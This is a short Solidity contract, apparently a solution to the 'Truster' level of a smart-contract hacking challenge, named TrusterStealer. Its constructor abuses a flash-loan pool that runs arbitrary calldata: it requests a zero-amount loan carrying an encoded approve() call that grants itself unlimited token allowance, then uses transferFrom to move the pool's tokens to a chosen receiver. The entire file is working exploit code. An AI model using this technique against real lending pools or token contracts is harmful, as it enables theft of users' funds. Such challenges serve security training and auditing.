pragma solidity ^0.8.0;

import "@openzeppelin/contracts/utils/Address.sol";

contract TrusterStealer {
  using Address for address;

  constructor(address pool, address token, address receiver, uint256 amount) {
    bytes memory data = abi.encodeWithSignature("approve(address,uint256)", address(this), type(uint).max);
    pool.functionCall(
      abi.encodeWithSignature(
        "flashLoan(uint256,address,address,bytes)",
        0,
        address(this),
        token,
        data
      )
    );
    token.functionCall(abi.encodeWithSignature("transferFrom(address,address,uint256)", pool, receiver, amount));
  }
}